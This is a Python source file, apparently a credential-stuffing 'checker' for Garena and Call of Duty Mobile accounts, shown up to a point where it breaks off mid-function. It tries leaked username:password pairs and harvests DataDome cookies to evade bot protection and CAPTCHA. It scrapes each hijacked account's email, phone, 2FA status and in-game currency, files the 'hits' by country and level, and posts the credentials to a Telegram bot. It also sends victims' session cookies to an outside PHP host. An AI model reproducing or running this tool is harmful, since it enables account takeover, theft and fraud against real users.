#--- START OF FILE project1.py ---

import os
import sys
import re
import time
import json
import uuid
import base64
import hashlib
import random
import logging
import urllib
import platform
import subprocess
import html
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
from collections import OrderedDict

# --- Dependency Checker ---
def check_and_install_dependencies():
    """Checks for and installs required packages if they are missing."""
    required_packages = {
        'requests': 'requests',
        'colorama': 'colorama',
        'tqdm': 'tqdm',
        'Crypto': 'pycryptodome'
    }
    print("[⚙️] Checking for required packages...")
    for import_name, pip_name in required_packages.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"[!] '{pip_name}' not found. Attempting to install...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
                print(f"[✅] '{pip_name}' installed successfully.")
            except Exception as e:
                print(f"[❌] Failed to install '{pip_name}'. Please install it manually using: pip install {pip_name}")
                print(f"Error: {e}")
                sys.exit(1)
    print("[✅] All required packages are installed.\n")

# Run dependency check right away
check_and_install_dependencies()

# --- Now import the checked packages ---
import requests
from tqdm import tqdm
from colorama import Fore, Style, init
from Crypto.Cipher import AES
# --- Import cookie modules ---
import change_cookie
import ken_cookie

# Initialize Colorama
init(autoreset=True)

# --- Constants ---
RED = "\033[31m"
RESET = "\033[0m"
BOLD = "\033[1;37m"
GREEN = "\033[32m"
apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
datenok = str(int(time.time()))

# --- Global Country to Keyword Map ---
COUNTRY_KEYWORD_MAP = {
    "PH": ["PHILIPPINES", "PH"], "ID": ["INDONESIA", "ID"], "US": ["UNITED STATES", "USA", "US"],
    "ES": ["SPAIN", "ES"], "VN": ["VIETNAM", "VN"], "CN": ["CHINA", "CN"], "MY": ["MALAYSIA", "MY"],
    "TW": ["TAIWAN", "TW"], "TH": ["THAILAND", "TH"], "RU": ["RUSSIA", "RUSSIAN FEDERATION", "RU"],
    "PT": ["PORTUGAL", "PT"],
}


# --- Helper Functions ---
def clear_screen():
    """Clears the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_app_data_directory():
    """Determines the directory for saving app data like tokens and cookies."""
    preferred_dir = "/storage/emulated/0/trese"
    if os.path.isdir(preferred_dir): return preferred_dir
    else:
        fallback_dir = "output"; os.makedirs(fallback_dir, exist_ok=True); return fallback_dir

def get_logs_directory():
    """Determines the directory for saving log files."""
    preferred_dir = "/storage/emulated/0/trese/logs"
    parent_dir = os.path.dirname(preferred_dir)
    if os.path.isdir(parent_dir): os.makedirs(preferred_dir, exist_ok=True); return preferred_dir
    else: fallback_dir = "logs"; os.makedirs(fallback_dir, exist_ok=True); return fallback_dir

def get_results_directory():
    """Determines the base directory for saving categorized hit results."""
    preferred_dir = "/storage/emulated/0/trese/results"
    parent_dir = os.path.dirname(preferred_dir)
    if os.path.isdir(parent_dir): os.makedirs(preferred_dir, exist_ok=True); return preferred_dir
    else: fallback_dir = "results"; os.makedirs(fallback_dir, exist_ok=True); return fallback_dir

def save_telegram_config(token, chat_id):
    """Saves Telegram credentials to a config file."""
    config_path = os.path.join(get_app_data_directory(), "telegram_config.json")
    config = {'bot_token': token, 'chat_id': chat_id}
    try:
        with open(config_path, 'w') as f: json.dump(config, f, indent=4)
        print(f"{Fore.GREEN}[💾] Telegram credentials saved successfully.{Style.RESET_ALL}")
    except IOError as e: print(f"{Fore.RED}Error saving Telegram config: {e}{Style.RESET_ALL}")

def load_telegram_config():
    """Loads Telegram credentials from a config file."""
    config_path = os.path.join(get_app_data_directory(), "telegram_config.json")
    if not os.path.exists(config_path): return None, None
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
            return config.get('bot_token'), config.get('chat_id')
    except (json.JSONDecodeError, IOError): return None, None

def save_progress_state(file_path, next_index, stats):
    """Saves the current checking progress to a state file."""
    state_file = os.path.join(get_app_data_directory(), 'progress_state.json')
    state = {
        'file_path': file_path,
        'next_index': next_index,
        'stats': stats,
        'timestamp': datetime.now().isoformat()
    }
    try:
        with open(state_file, 'w') as f:
            json.dump(state, f, indent=4)
    except IOError:
        pass # Can't do much if this fails, just let it pass

def load_progress_state():
    """Loads a saved progress state file, if it exists."""
    state_file = os.path.join(get_app_data_directory(), 'progress_state.json')
    if os.path.exists(state_file):
        try:
            with open(state_file, 'r') as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            return None
    return None

def clear_progress_state():
    """Deletes the progress state file."""
    state_file = os.path.join(get_app_data_directory(), 'progress_state.json')
    if os.path.exists(state_file):
        try:
            os.remove(state_file)
        except OSError:
            pass
            
def strip_ansi_codes_jarell(text):
    ansi_escape_jarell = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape_jarell.sub('', text)

def get_datenow(): return datenok

def generate_md5_hash(password):
    md5_hash = hashlib.md5(); md5_hash.update(password.encode('utf-8')); return md5_hash.hexdigest()

def generate_decryption_key(password_md5, v1, v2):
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    return hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()

def encrypt_aes_256_ecb(plaintext, key):
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    chiper_raw = cipher.encrypt(plaintext_bytes)
    return chiper_raw.hex()[:32]

def getpass(password, v1, v2):
    password_md5 = generate_md5_hash(password)
    decryption_key = generate_decryption_key(password_md5, v1, v2)
    return encrypt_aes_256_ecb(password_md5, decryption_key)

def get_datadome_cookie(pbar):
    url = 'https://dd.garena.com/js/'
    headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br, zstd','accept-language': 'en-US,en;q=0.9','cache-control': 'no-cache','content-type': 'application/x-www-form-urlencoded','origin': 'https://account.garena.com','pragma': 'no-cache','referer': 'https://account.garena.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'}
    js_data_dict = {"ttst": 76.7, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "lg": "en-US", "plg": 5, "plgne": True, "vnd": "Google Inc."}
    payload = {'jsData': json.dumps(js_data_dict), 'eventCounters' : '[]', 'jsType': 'ch', 'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae', 'ddk': 'AE3F04AD3F0D3A462481A337485081', 'Referer': 'https://account.garena.com/', 'request': '/', 'responsePage': 'origin', 'ddv': '4.35.4'}
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            pbar.write(f"{Fore.GREEN}[🍪] Successfully fetched a new DataDome cookie from server.{Style.RESET_ALL}")
            return cookie_string.split(';')[0].split('=')[1]
        return None
    except requests.exceptions.RequestException: return None

# NEW FUNCTION: For handling CAPTCHA by fetching a new set of cookies
def fetch_new_datadome_pool(num_cookies=5):
    """Fetches a new pool of DataDome cookies with a progress bar."""
    print(f"\n{Fore.CYAN}[⚙️] Attempting to fetch {num_cookies} new DataDome cookies...{Style.RESET_ALL}")
    new_pool = []
    # Use a separate tqdm instance for this process
    with tqdm(total=num_cookies, desc="Fetching Cookies", unit="cookie", leave=False, bar_format="{desc}: {bar} {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as fetch_pbar:
        for _ in range(num_cookies):
            new_cookie = get_datadome_cookie(fetch_pbar) # Pass the fetch_pbar to the function
            if new_cookie and new_cookie not in new_pool:
                new_pool.append(new_cookie)
                fetch_pbar.set_postfix_str(f"Found: {len(new_pool)}")
            fetch_pbar.update(1)
            time.sleep(random.uniform(0.5, 1.5)) # Be polite to the server
    
    if new_pool:
        print(f"{Fore.GREEN}[✅] Successfully fetched {len(new_pool)} new unique cookies.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[❌] Failed to fetch any new cookies. Your IP might be heavily restricted.{Style.RESET_ALL}")
    return new_pool

def save_successful_token(token, pbar):
    if not token: return
    output_dir = get_app_data_directory()
    file_path = os.path.join(output_dir, "token_sessions.json")
    token_pool = []
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as f:
                data = json.load(f)
                if isinstance(data, list): token_pool = data
        except (json.JSONDecodeError, IOError): pass
    if token not in token_pool:
        token_pool.append(token)
        try:
            with open(file_path, 'w') as f: json.dump(token_pool, f, indent=4)
            pbar.write(f"{Fore.GREEN}[💾] New Token Session saved to pool.{Style.RESET_ALL}")
        except IOError as e: pbar.write(f"{Fore.RED}Error saving token session file: {e}{Style.RESET_ALL}")

def save_datadome_cookie(cookie_value, pbar):
    if not cookie_value: return
    output_dir = get_app_data_directory()
    file_path = os.path.join(output_dir, "datadome_cookies.json")
    cookie_pool = []
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as f:
                data = json.load(f)
                if isinstance(data, list): cookie_pool = data
        except (json.JSONDecodeError, IOError): pass
    new_cookie_obj = {'datadome': cookie_value}
    if not any(c.get('datadome') == cookie_value for c in cookie_pool):
        cookie_pool.append(new_cookie_obj)
        try:
            with open(file_path, 'w') as f: json.dump(cookie_pool, f, indent=4)
            pbar.write(f"{Fore.CYAN}[💾] New DataDome Cookie saved to pool.{Style.RESET_ALL}")
        except IOError as e: pbar.write(f"{Fore.RED}Error saving datadome cookie file: {e}{Style.RESET_ALL}")

def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date, selected_cookie_module, pbar):
    cookies["datadome"] = dataa
    login_params = {'app_id': '100082', 'account': account_username, 'password': encryptedpassword, 'redirect_uri': redrov, 'format': 'json', 'id': _id}
    login_url = apkrov + urlencode(login_params)
    try:
        response = requests.get(login_url, headers=selected_header, cookies=cookies, timeout=60)
        response.raise_for_status()
        login_json_response = response.json()
    except requests.exceptions.RequestException as e: return f"[⚠️] Request Error: {e}"
    except json.JSONDecodeError: return f"[💢] Invalid JSON: {response.text[:100]}"
    if 'error_auth' in login_json_response or 'error' in login_json_response: return "[🔐] ɪɴᴄᴏʀʀᴇᴄᴛ ᴘᴀssᴡᴏʀᴅ"
    session_key = login_json_response.get('session_key')
    if not session_key: return "[FAILED] No session key found after login"
    pbar.write(f"{Fore.GREEN}[🔑] Successfully obtained session_key.{Style.RESET_ALL}")
    successful_token = response.cookies.get('token_session')
    if successful_token: save_successful_token(successful_token, pbar)
    set_cookie = response.headers.get('Set-Cookie', '')
    sso_key = set_cookie.split('=')[1].split(';')[0] if '=' in set_cookie else ''
    coke = selected_cookie_module.get_cookies()
    coke["datadome"] = dataa
    coke["sso_key"] = sso_key
    if successful_token: coke["token_session"] = successful_token
    hider = {'Host': 'account.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"', 'sec-ch-ua-mobile': '?1', 'User-Agent': selected_header["User-Agent"], 'Accept': 'application/json, text/plain, */*', 'Referer': f'https://account.garena.com/?session_key={session_key}', 'Accept-Language': 'en-US,en;q=0.9'}
    init_url = 'http://gakumakupal.x10.bz/patal.php'
    params = {f'coke_{k}': v for k, v in coke.items()}
    params.update({f'hider_{k}': v for k, v in hider.items()})
    try:
        init_response = requests.get(init_url, params=params, timeout=120)
        init_response.raise_for_status()
        init_json_response = init_response.json()
    except (requests.RequestException, json.JSONDecodeError) as e: return f"[ERROR] Bind check failed: {e}"
    if 'error' in init_json_response or not init_json_response.get('success', True): return f"[ERROR] {init_json_response.get('error', 'Unknown error during bind check')}"
    bindings = init_json_response.get('bindings', [])
    is_clean = init_json_response.get('status') == "\033[0;32m\033[1mClean\033[0m"
    country, last_login, fb, mobile, facebook = "N/A", "N/A", "N/A", "N/A", "False"
    shell, email = "0", "N/A"
    email_verified, authenticator_enabled, two_step_enabled = "False", "False", "False"
    for item in bindings:
        try:
            key, value = item.split(":", 1)
            value = value.strip()
            if key == "Country": country = value
            elif key == "LastLogin": last_login = value
            elif key == "Garena Shells": shell = value
            elif key == "Facebook Account": fb, facebook = value, "True"
            elif key == "Mobile Number": mobile = value
            elif key == "tae": email_verified = "True"
            elif key == "eta": email = value
            elif key == "Authenticator": authenticator_enabled = "True"
            elif key == "Two-Step Verification": two_step_enabled = "True"
        except ValueError: continue
    save_datadome_cookie(dataa, pbar)
    head = {"Host": "auth.garena.com", "Connection": "keep-alive", "Accept": "application/json, text/plain, */*", "User-Agent": selected_header["User-Agent"], "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "Origin": "https://auth.garena.com", "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"}
    data_payload = {"client_id": "100082", "response_type": "token", "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/", "format": "json", "id": _id}
    try:
        grant_url = "https://auth.garena.com/oauth/token/grant"
        reso = requests.post(grant_url, headers=head, data=data_payload, cookies=coke)
        reso.raise_for_status()
        data = reso.json()
        if "access_token" in data:
            pbar.write(f"{Fore.GREEN}[🔑] Successfully obtained access_token. Fetching game details...{Style.RESET_ALL}")
            game_info = show_level(data["access_token"], selected_header, sso_key, successful_token, get_datadome_cookie(pbar), coke)
            codm_level = 'N/A'
            if "[FAILED]" in game_info:
                connected_games = ["No CODM account found or error fetching data."]
            else:
                codm_nickname, codm_level, codm_region, uid = game_info.split("|")
                connected_games = [f"  Nickname: {codm_nickname}\n  Level: {codm_level}\n  Region: {codm_region}\n  UID: {uid}"] if uid and uid != 'N/A' else ["No CODM account found"]
            return format_result(last_login, country, shell, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, email, date, account_username, password, codm_level)
        else: return f"[FAILED] 'access_token' not found in grant response."
    except (requests.RequestException, json.JSONDecodeError) as e: return f"[FAILED] Token grant failed: {e}"

def show_level(access_token, selected_header, sso, token, newdate, cookie):
    url = "https://auth.codm.garena.com/auth/auth/callback_n"
    params = {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token}
    headers = {"Referer": "https://auth.garena.com/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
    cookie.update({"datadome": newdate, "sso_key": sso, "token_session": token})
    try:
        res = requests.get(url, headers=headers, cookies=cookie, params=params, timeout=30, allow_redirects=True)
        res.raise_for_status()
        parsed_url = urlparse(res.url)
        extracted_token = parse_qs(parsed_url.query).get("token", [None])[0]
        if not extracted_token: return "[FAILED] No token extracted from redirected URL."
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_login_headers = {"codm-delete-token": extracted_token, "Origin": "https://delete-request.codm.garena.co.id", "Referer": "https://delete-request.codm.garena.co.id/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
        check_login_response = requests.get(check_login_url, headers=check_login_headers, timeout=30)
        check_login_response.raise_for_status()
        data = check_login_response.json()
        if data and "user" in data:
            user = data["user"]
            return f"{user.get('codm_nickname', 'N/A')}|{user.get('codm_level', 'N/A')}|{user.get('region', 'N/A')}|{user.get('uid', 'N/A')}"
        else: return "[FAILED] NO CODM ACCOUNT!"
    except (requests.RequestException, json.JSONDecodeError, KeyError, IndexError) as e: return f"[FAILED] CODM data fetch error: {e}"

def format_result(last_login, country, shell, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, email, date, username, password, codm_level):
    BRIGHT_CYAN, BRIGHT_GREEN, BRIGHT_YELLOW, BRIGHT_WHITE, DIM_WHITE, RED, RESET = Fore.CYAN + Style.BRIGHT, Fore.GREEN + Style.BRIGHT, Fore.YELLOW + Style.BRIGHT, Fore.WHITE + Style.BRIGHT, Style.DIM + Fore.WHITE, Fore.RED, Style.RESET_ALL
    align = lambda key, length=18: f"{key:<{length}}"
    clean_status_text = f"{BRIGHT_GREEN}Clean ✔" if is_clean else f"{BRIGHT_YELLOW}Not Clean ⚠️"
    email_ver_text = f"({BRIGHT_GREEN}Verified✔{RESET})" if email_verified == "True" else f"({BRIGHT_YELLOW}Not Verified⚠️{RESET})"
    bool_status = lambda status_str: f"{BRIGHT_GREEN}True ✔" if status_str == 'True' else f"{RED}False ❌"
    has_codm = "No CODM account found" not in connected_games[0]
    codm_section = "\n".join([f"{DIM_WHITE}│ {BRIGHT_CYAN}{line}{RESET}" for line in connected_games[0].split('\n')]) if has_codm else f"{DIM_WHITE}│ {BRIGHT_YELLOW}No CODM account data found.{RESET}"
    console_message = f"""
{BRIGHT_GREEN}╭─────────────────────────────╮{RESET}
{BRIGHT_GREEN}│   [✅] GARENA ACCOUNT HIT   │{RESET}
{BRIGHT_GREEN}╰─────────────────────────────╯{RESET}
{DIM_WHITE}╭─[{BRIGHT_WHITE}🔑 Credentials{DIM_WHITE}]─╮{RESET}
{DIM_WHITE}│ {BRIGHT_WHITE}{align('User')}: {BRIGHT_CYAN}{username}{RESET}
{DIM_WHITE}│ {BRIGHT_WHITE}{align('Pass')}: {BRIGHT_CYAN}{password}{RESET}
{DIM_WHITE}╰──────────────────────╯{RESET}
{DIM_WHITE}╭─[{BRIGHT_WHITE}📊 Information{DIM_WHITE}]─╮{RESET}
{DIM_WHITE}│ {BRIGHT_WHITE}{align('Country')}: {BRIGHT_CYAN}{country}{RESET}
{DIM_WHITE}│ {BRIGHT_WHITE}{align('Shells')}: {BRIGHT_GREEN if shell and shell != '0' else BRIGHT_YELLOW}{shell} 💰{RESET}
{DIM_WHITE}│ {BRIGHT_WHITE}{align('Last Login')}: {BRIGHT_CYAN}{last_login}{RESET}
{DIM_WHITE}│ {BRIGHT_WHITE}{align('Email')}: {BRIGHT_CYAN}{email} {email_ver_text}{RESET}
{DIM_WHITE}│ {BRIGHT_WHITE}{align('Facebook')}: {BRIGHT_CYAN}{fb}{RESET}
{DIM_WHITE}╰──────────────────────╯{RESET}
{DIM_WHITE}╭─[{BRIGHT_WHITE}🎮 CODM Details{DIM_WHITE}]───╮{RESET}
{codm_section}
{DIM_WHITE}╰──────────────────────╯{RESET}
{DIM_WHITE}╭─[{BRIGHT_WHITE}🛡️ Security{DIM_WHITE}]─────╮{RESET}
{DIM_WHITE}│ {BRIGHT_WHITE}{align('Status')}: {clean_status_text}{RESET}
{DIM_WHITE}│ {BRIGHT_WHITE}{align('Mobile Bind')}: {bool_status('True' if mobile != 'N/A' else 'False')}{RESET}
{DIM_WHITE}│ {BRIGHT_WHITE}{align('Facebook Link')}: {bool_status(facebook)}{RESET}
{DIM_WHITE}│ {BRIGHT_WHITE}{align('2FA Enabled')}: {bool_status(two_step_enabled)}{RESET}
{DIM_WHITE}│ {BRIGHT_WHITE}{align('Authenticator')}: {bool_status(authenticator_enabled)}{RESET}
{DIM_WHITE}╰──────────────────────╯{RESET}
{BRIGHT_YELLOW}      - 𝐏𝐫𝐞𝐬𝐞𝐧𝐭𝐞𝐝 𝐁𝐲: @KenshiKupal -{RESET}
""".strip()
    codm_level_num = int(codm_level) if isinstance(codm_level, str) and codm_level.isdigit() else 0
    telegram_message = None
    if has_codm:
        s_user, s_pass, s_country = html.escape(username), html.escape(password), html.escape(country)
        s_email, s_fb, s_last_login = html.escape(email), html.escape(fb), html.escape(last_login)
        tg_clean_status, tg_email_ver = ("Clean ✔", "(Verified✔)") if is_clean else ("Not Clean ⚠️", "(Not Verified⚠️)")
        tg_codm_info = "\n".join([f"  <code>{html.escape(line.strip())}</code>" for line in connected_games[0].strip().split('\n')])
        tg_title = "✅ <b>GARENA ACCOUNT HIT | LEVEL 100+</b> ✅" if codm_level_num >= 100 else "✅ <b>GARENA ACCOUNT HIT</b> ✅"
        telegram_message = f"""
{tg_title}

- - - - - - - - - - - - - - - - -
🔑  <b><u>Credentials:</u></b>
  <b>User:</b> <code>{s_user}</code>
  <b>Pass:</b> <code>{s_pass}</code>

- - - - - - - - - - - - - - - - -
📊  <b><u>Account Info:</u></b>
  <b>Country:</b> {s_country}
  <b>Shells:</b> {shell} 💰
  <b>Last Login:</b> {s_last_login}
  <b>Email:</b> <code>{s_email}</code> {tg_email_ver}
  <b>Facebook:</b> <code>{s_fb}</code>

- - - - - - - - - - - - - - - - -
🎮  <b><u>CODM Details:</u></b>
{tg_codm_info}

- - - - - - - - - - - - - - - - -
🛡️  <b><u>Security Status:</u></b>
  <b>Account Status:</b> {tg_clean_status}
  <b>Mobile Bind:</b> {'True ✔' if mobile != 'N/A' else 'False ❌'}
  <b>Facebook Link:</b> {'True ✔' if facebook == 'True' else 'False ❌'}
  <b>2FA Enabled:</b> {'True ✔' if two_step_enabled == 'True' else 'False ❌'}
  <b>Authenticator:</b> {'True ✔' if authenticator_enabled == 'True' else 'False ❌'}

- - - - - - - - - - - - - - - - -
<i>Presented By: @KenshiKupal</i>
        """.strip()
    country_folder, country_upper = "Others", str(country).upper()
    for folder_key, keywords in COUNTRY_KEYWORD_MAP.items():
        if any(keyword in country_upper for keyword in keywords): country_folder = folder_key; break
    level_range = "No_CODM_Data"
    if has_codm:
        if 1 <= codm_level_num <= 50: level_range = "1-50"
        elif 51 <= codm_level_num <= 100: level_range = "51-100"
        elif 101 <= codm_level_num <= 200: level_range = "101-200"
        elif 201 <= codm_level_num <= 300: level_range = "201-300"
        elif 301 <= codm_level_num <= 400: level_range = "301-400"
    clean_tag = "clean" if is_clean else "not_clean"
    country_path = os.path.join(get_results_directory(), country_folder)
    os.makedirs(country_path, exist_ok=True)
    with open(os.path.join(country_path, f"{level_range}_{clean_tag}.txt"), "a", encoding="utf-8") as f:
        f.write(strip_ansi_codes_jarell(console_message) + "\n" + "=" * 60 + "\n")
    # FIX: Pass the is_clean boolean back so the counter can use it directly
    return (console_message, telegram_message, codm_level_num, country, username, password, shell, has_codm, is_clean)

def get_request_data(selected_cookie_module):
    cookies = selected_cookie_module.get_cookies()
    headers = {'Host': 'auth.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36', 'sec-ch-ua-platform': '"Android"', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'}
    return cookies, headers

def check_account(username, password, date, datadome_cookie, selected_cookie_module, pbar):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            random_id = "17290585" + str(random.randint(10000, 99999))
            cookies, headers = get_request_data(selected_cookie_module)
            if datadome_cookie: cookies['datadome'] = datadome_cookie
            params, login_url = {"app_id": "100082", "account": username, "format": "json", "id": random_id}, "https://auth.garena.com/api/prelogin"
            response = requests.get(login_url, params=params, cookies=cookies, headers=headers, timeout=20)
            if "captcha" in response.text.lower(): return "[CAPTCHA]"
            if response.status_code == 200:
                data = response.json()
                if not all(k in data for k in ['v1', 'v2', 'id']): return "[😢] 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗜𝗗𝗡'𝗧 𝗘𝗫𝗜𝗦𝗧"
                login_datadome = response.cookies.get('datadome') or datadome_cookie
                if "error" in data: return f"[FAILED] Pre-login error: {data['error']}"
                encrypted_password = getpass(password, data['v1'], data['v2'])
                return check_login(username, random_id, encrypted_password, password, headers, cookies, login_datadome, date, selected_cookie_module, pbar)
            else: return f"[FAILED] HTTP Status: {response.status_code}"
        except requests.exceptions.RequestException as e:
            error_str = str(e).lower()
            if "failed to establish a new connection" in error_str or "max retries exceeded" in error_str or "network is unreachable" in error_str:
                pbar.write(f"{Fore.YELLOW}[⚠️] Connection error for {username}. Retrying ({attempt + 1}/{max_retries})...{Style.RESET_ALL}")
                if attempt < max_retries - 1: time.sleep(5); continue
                else: return f"[FAILED] Connection failed after {max_retries} retries."
            else: return f"[FAILED] Unexpected Request Error: {e}"
        except Exception as e: return f"[FAILED] Unexpected Error: {e}"

def send_to_telegram(bot_token, chat_id, message):
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML', 'disable_web_page_preview': True}
    try:
        response = requests.post(api_url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception: return False

def bulk_check(file_path, telegram_bot_token, telegram_chat_id, selected_cookie_module, auto_delete=False, resume_state=None):
    stats = {
        'successful': 0, 'failed': 0, 'clean': 0, 'not_clean': 0, 'incorrect_pass': 0,
        'no_exist': 0, 'other_fail': 0, 'telegram_sent': 0, 'captcha_count': 0,
        'highest_level': 0, 'highest_level_info': "None Found",
        'level_distribution': {"1-50": 0, "51-100": 0, "101-200": 0, "201-300": 0, "301-400": 0, "No_CODM_Data": 0},
        'country_counts': {},
        'shell_accounts': []
    }
    date = get_datenow()
    failed_file = os.path.join(get_logs_directory(), f"failed_{date}.txt")
    account_idx, pbar, total_accounts = 0, None, 0
    initial_offset = 0

    if resume_state:
        # Load all stats, using default if a key is missing from the old state file
        for key, value in resume_state.get('stats', {}).items():
            if key in stats:
                stats[key] = value
        account_idx = resume_state.get('next_index', 0)
        initial_offset = account_idx
        file_path = resume_state.get('file_path', file_path)
        print(f"\n{Fore.CYAN}[▶️] Resuming from account #{account_idx + 1}...{Style.RESET_ALL}")

    try:
        accounts, total_accounts = remove_duplicates_from_file(file_path)
        if initial_offset > 0:
            print(f"\n{Fore.GREEN}[📥] Loaded: {total_accounts} unique accounts (Skipping first {initial_offset} as they were already checked)\n")
        else:
            print(f"\n{Fore.GREEN}[📥] Loaded: {total_accounts} unique accounts\n")
            
        pbar = tqdm(initial=initial_offset, total=total_accounts, desc="Checking", unit="acc", bar_format="{desc}: {n_fmt}/{total_fmt} [{postfix}]", leave=True)
        datadome_pool, cookie_index = [], 0
        try:
            cookie_file = os.path.join(get_app_data_directory(), "datadome_cookies.json")
            if os.path.exists(cookie_file):
                with open(cookie_file, 'r') as f:
                    loaded_cookies = json.load(f)
                    if isinstance(loaded_cookies, list): datadome_pool = [c.get('datadome') for c in loaded_cookies if 'datadome' in c]
            if datadome_pool: pbar.write(f"{Fore.CYAN}[🍪] Loaded {len(datadome_pool)} DataDome cookies from pool.{Style.RESET_ALL}")
            else: pbar.write(f"{Fore.YELLOW}[⚠️] DataDome cookie pool is empty or not found.{Style.RESET_ALL}")
        except (FileNotFoundError, json.JSONDecodeError): pbar.write(f"{Fore.YELLOW}[⚠️] Could not read datadome_cookies.json file.{Style.RESET_ALL}")
        current_datadome = datadome_pool[cookie_index] if datadome_pool else get_datadome_cookie(pbar)
        if not current_datadome: pbar.write(f"{Fore.RED}[❌] Failed to get an initial DataDome cookie. Exiting.{Style.RESET_ALL}"); return
        with open(failed_file, 'a', encoding='utf-8') as failed_out:
            while account_idx < len(accounts):
                acc = accounts[account_idx]
                if ':' in acc:
                    username, password = acc.split(':', 1)
                    pbar.write(f"\n{Fore.CYAN}[▶] Preparing to check: {username}:{password}{Style.RESET_ALL}")
                    result = check_account(username, password, date, current_datadome, selected_cookie_module, pbar)
                    
                    # --- NEW ENHANCED CAPTCHA HANDLING ---
                    if result == "[CAPTCHA]":
                        stats['captcha_count'] += 1
                        pbar.write(f"\n{RED}[🔴 𝐒𝐓𝐎𝐏] CAPTCHA Detected! Your current IP or Cookie is likely blocked.{RESET}")
                        
                        should_exit = False
                        while True: # Loop for the CAPTCHA menu
                            pbar.write(f"{Fore.YELLOW}\nThe checker is paused. Please choose an action:{Style.RESET_ALL}")
                            print(f"\n{Fore.CYAN}--- CAPTCHA Recovery Options ---{Style.RESET_ALL}")
                            print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Fetch a new pool of DataDome cookies automatically (Recommended).")
                            print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} I have changed my IP/VPN. Retry the check.")
                            print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Try the next cookie from the existing pool ({max(0, len(datadome_pool) - (cookie_index + 1))} remaining).")
                            print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Exit the checker.")
                            choice = input(f"{Fore.GREEN}Enter your choice [1-4]: {Style.RESET_ALL}").strip()

                            if choice == '1':
                                pbar.write(f"{Fore.CYAN}[🔄] Attempting to fetch a new cookie pool...{Style.RESET_ALL}")
                                new_pool = fetch_new_datadome_pool(num_cookies=5) # Call helper function
                                if new_pool:
                                    datadome_pool = new_pool
                                    cookie_index = 0
                                    current_datadome = datadome_pool[cookie_index]
                                    # Overwrite the old cookie pool file with the new one
                                    try:
                                        cookie_file_path = os.path.join(get_app_data_directory(), "datadome_cookies.json")
                                        pool_to_save = [{'datadome': c} for c in new_pool]
                                        with open(cookie_file_path, 'w') as f: json.dump(pool_to_save, f, indent=4)
